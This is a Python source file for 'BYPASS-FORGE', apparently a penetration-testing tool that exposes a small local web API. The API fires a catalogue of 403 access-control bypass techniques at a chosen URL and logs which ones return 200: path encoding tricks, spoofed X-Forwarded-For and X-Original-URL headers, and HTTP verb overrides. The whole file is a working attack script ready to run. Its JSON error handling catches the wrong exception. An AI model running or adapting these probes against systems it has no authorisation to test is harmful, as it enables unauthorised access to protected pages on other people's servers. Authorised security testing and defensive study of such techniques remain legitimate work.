#!/usr/bin/env python3

# MIT License
#
# Copyright (c) 2026 Ray
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

import hashlib
import json
import os
import re
import ssl
import threading
import time
import urllib.error
import urllib.request
from collections import defaultdict
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse

ssl_ctx = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
ssl_ctx.check_hostname = True
ssl_ctx.verify_mode = ssl.CERT_REQUIRED
ssl_ctx.load_default_certs()

ALLOWED_ORIGIN  = "http://127.0.0.1:8080"
RATE_LIMIT_REQ  = 20
RATE_LIMIT_WIN  = 60
MAX_URL_LEN     = 512
CALLSIGN        = os.getenv("FORGE_CALLSIGN", "rayrock92610")
BLOCKED_HOSTS   = {"localhost", "169.254.169.254", "0.0.0.0"}

BYPASS_TECHNIQUES = [
    {"id":"P01","cat":"Path","label":"Trailing Slash","mod":"url","val":"{url}/"},
    {"id":"P02","cat":"Path","label":"Double Slash","mod":"url","val":"{url}//"},
    {"id":"P03","cat":"Path","label":"URL Encoded Slash","mod":"url","val":"{url}/%2F"},
    {"id":"P04","cat":"Path","label":"Dot Segment","mod":"url","val":"{url}/./"},
    {"id":"P05","cat":"Path","label":"Double Dot","mod":"url","val":"{url}/../{path}"},
    {"id":"P06","cat":"Path","label":"Null Byte","mod":"url","val":"{url}/%00"},
    {"id":"P07","cat":"Path","label":"Semicolon","mod":"url","val":"{url};/"},
    {"id":"P08","cat":"Path","label":"Hash Fragment","mod":"url","val":"{url}#"},
    {"id":"P09","cat":"Path","label":"Uppercase Path","mod":"url","val":"UPPER"},
    {"id":"P10","cat":"Path","label":"Double Encode","mod":"url","val":"{url}/%252F"},
    {"id":"H01","cat":"Header","label":"X-Forwarded-For: 127.0.0.1","mod":"header","val":"X-Forwarded-For: 127.0.0.1"},
    {"id":"H02","cat":"Header","label":"X-Forwarded-For: localhost","mod":"header","val":"X-Forwarded-For: localhost"},
    {"id":"H03","cat":"Header","label":"X-Real-IP: 127.0.0.1","mod":"header","val":"X-Real-IP: 127.0.0.1"},
    {"id":"H04","cat":"Header","label":"X-Custom-IP-Authorization","mod":"header","val":"X-Custom-IP-Authorization: 127.0.0.1"},
    {"id":"H05","cat":"Header","label":"X-Originating-IP","mod":"header","val":"X-Originating-IP: 127.0.0.1"},
    {"id":"H06","cat":"Header","label":"X-Remote-IP","mod":"header","val":"X-Remote-IP: 127.0.0.1"},
    {"id":"H07","cat":"Header","label":"X-Client-IP","mod":"header","val":"X-Client-IP: 127.0.0.1"},
    {"id":"H08","cat":"Header","label":"Referer: target","mod":"header","val":"Referer: {url}"},
    {"id":"H09","cat":"Header","label":"X-Original-URL","mod":"header","val":"X-Original-URL: {path}"},
    {"id":"H10","cat":"Header","label":"X-Rewrite-URL","mod":"header","val":"X-Rewrite-URL: {path}"},
    {"id":"H11","cat":"Header","label":"Content-Length: 0","mod":"header","val":"Content-Length: 0"},
    {"id":"H12","cat":"Header","label":"X-Host: 127.0.0.1","mod":"header","val":"X-Host: 127.0.0.1"},
    {"id":"V01","cat":"Verb","label":"POST instead of GET","mod":"verb","val":"POST"},
    {"id":"V02","cat":"Verb","label":"PUT","mod":"verb","val":"PUT"},
    {"id":"V03","cat":"Verb","label":"PATCH","mod":"verb","val":"PATCH"},
    {"id":"V04","cat":"Verb","label":"OPTIONS","mod":"verb","val":"OPTIONS"},
    {"id":"V05","cat":"Verb","label":"HEAD","mod":"verb","val":"HEAD"},
    {"id":"V06","cat":"Verb","label":"TRACE","mod":"verb","val":"TRACE"},
    {"id":"V07","cat":"Verb","label":"CONNECT","mod":"verb","val":"CONNECT"},
    {"id":"V08","cat":"Verb","label":"X-HTTP-Method-Override: GET","mod":"header","val":"X-HTTP-Method-Override: GET"},
    {"id":"V09","cat":"Verb","label":"X-Method-Override: GET","mod":"header","val":"X-Method-Override: GET"},
]

findings      = []
findings_lock = threading.Lock()
rate_table    = defaultdict(list)
rate_lock     = threading.Lock()

def sign_finding(f):
    f["callsign"] = CALLSIGN
    f["sig"] = hashlib.sha256(
        f"{f['ts']}|{f['id']}|{f['url']}|{f['code']}|{CALLSIGN}".encode()
    ).hexdigest()[:16]
    return f

def rate_check(ip):
    now = time.time()
    with rate_lock:
        rate_table[ip] = [t for t in rate_table[ip] if now - t < RATE_LIMIT_WIN]
        if len(rate_table[ip]) >= RATE_LIMIT_REQ:
            return False
        rate_table[ip].append(now)
    return True

def sanitize_url(url):
    if not url or len(url) > MAX_URL_LEN:
        return None, "URL too long or empty"
    url = url.strip()
    if not re.match(r'^https?://', url):
        return None, "Must start with http:// or https://"
    parsed = urlparse(url)
    host = parsed.hostname or ""
    if host in BLOCKED_HOSTS:
        return None, f"Blocked host: {host}"
    if re.match(r'^(10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.)', host):
        return None, "Private IP range blocked"
    url = re.sub(r'[\x00-\x1f\x7f]', '', url)
    return url, None

def validate_techniques(ids):
    valid = {t["id"] for t in BYPASS_TECHNIQUES}
    return [i for i in ids if i in valid]

def classify(code):
    if code == 200:               return "BYPASS"
    if code in [301,302,307,308]: return "REDIRECT"
    if code == 401:               return "AUTH"
    if code == 403:               return "BLOCKED"
    if code == 404:               return "NOT_FOUND"
    if code == 500:               return "SERVER_ERR"
    return "OTHER"

def fire_technique(target_url, tech, timeout=8):
    parsed  = urlparse(target_url)
    path    = parsed.path or "/"
    base    = f"{parsed.scheme}://{parsed.netloc}"
    url     = target_url
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36",
        "Accept": "*/*",
    }
    method = "GET"
    mod, val = tech["mod"], tech["val"]
    if mod == "url":
        url = base + path.upper() if val == "UPPER" else \
              val.replace("{url}", target_url).replace("{path}", path)
    elif mod == "header":
        k, v = val.split(": ", 1)
        headers[k] = v.replace("{url}", target_url).replace("{path}", path)
    elif mod == "verb":
        method = val
    try:
        req = urllib.request.Request(url, headers=headers, method=method)
        res = urllib.request.urlopen(req, timeout=timeout, context=ssl_ctx)
        code   = res.status
        length = len(res.read())
    except urllib.error.HTTPError as e:
        code   = e.code
        length = 0
    except urllib.error.URLError:
        code   = 0
        length = 0
    result = sign_finding({
        "ts": time.strftime("%Y-%m-%d %H:%M:%S"),
        "id": tech["id"], "cat": tech["cat"],
        "label": tech["label"], "url": url,
        "method": method, "code": code,
        "verdict": classify(code), "bytes": length,
    })
    with findings_lock:
        findings.append(result)
    return result

class ForgeHandler(BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def _ip(self): return self.client_address[0]
    def _cors(self):
        self.send_header("Access-Control-Allow-Origin", ALLOWED_ORIGIN)
        self.send_header("Access-Control-Allow-Methods", "POST, GET, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.send_header("X-Content-Type-Options", "nosniff")
        self.send_header("X-Frame-Options", "DENY")
    def _json(self, data, code=200):
        body = json.dumps(data).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", len(body))
        self._cors()
        self.end_headers()
        self.wfile.write(body)
    def _rate_gate(self):
        if not rate_check(self._ip()):
            self._json({"error": "Rate limit exceeded"}, 429)
            return False
        return True
    def do_OPTIONS(self):
        origin = self.headers.get("Origin", "")
        if origin != ALLOWED_ORIGIN:
            self.send_response(403)
            self.end_headers()
            return
        self.send_response(200)
        self._cors()
        self.end_headers()
    def do_GET(self):
        if not self._rate_gate(): return
        if self.path == "/techniques":
            self._json(BYPASS_TECHNIQUES)
        elif self.path == "/findings":
            with findings_lock: self._json(findings)
        elif self.path == "/findings/export":
            with findings_lock: data = json.dumps(findings, indent=2)
            ts = time.strftime("%Y%m%d_%H%M%S")
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Disposition",
                f"attachment; filename=forge_{CALLSIGN}_{ts}.json")
            self._cors(); self.end_headers()
            self.wfile.write(data.encode())
        elif self.path == "/health":
            self._json({"status":"ok","callsign":CALLSIGN,
                        "techniques":len(BYPASS_TECHNIQUES)})
        else:
            self.send_response(404); self.end_headers()
    def do_POST(self):
        if not self._rate_gate(): return
        origin = self.headers.get("Origin", "")
        if origin != ALLOWED_ORIGIN:
            self._json({"error": "Forbidden"}, 403); return
        if self.path == "/fire":
            length = int(self.headers.get("Content-Length", 0))
            try: body = json.loads(self.rfile.read(length))
            except urllib.error.URLError:
                self._json({"error": "Invalid JSON"}, 400)
                return
            raw_url = body.get("url", "")
            url, err = sanitize_url(raw_url)
            if err: self._json({"error": err}, 400); return
            raw_ids  = body.get("techniques", [t["id"] for t in BYPASS_TECHNIQUES])
            safe_ids = validate_techniques(raw_ids)
            if not safe_ids: self._json({"error": "No valid techniques"}, 400); return
            techs = [t for t in BYPASS_TECHNIQUES if t["id"] in safe_ids]
            def run():
                for tech in techs: fire_technique(url, tech)
            threading.Thread(target=run, daemon=True).start()
            self._json({"status":"firing","count":len(techs),"callsign":CALLSIGN})
        elif self.path == "/findings/clear":
            with findings_lock: findings.clear()
            self._json({"status": "cleared"})
        else:
            self.send_response(404); self.end_headers()

if __name__ == "__main__":
    server = HTTPServer(("0.0.0.0", 7444), ForgeHandler)
    print(f"[BYPASS-FORGE] v3 | callsign={CALLSIGN}")
    print("[BYPASS-FORGE] http://127.0.0.1:7444")
    print(f"[BYPASS-FORGE] {len(BYPASS_TECHNIQUES)} techniques loaded")

    server.serve_forever()
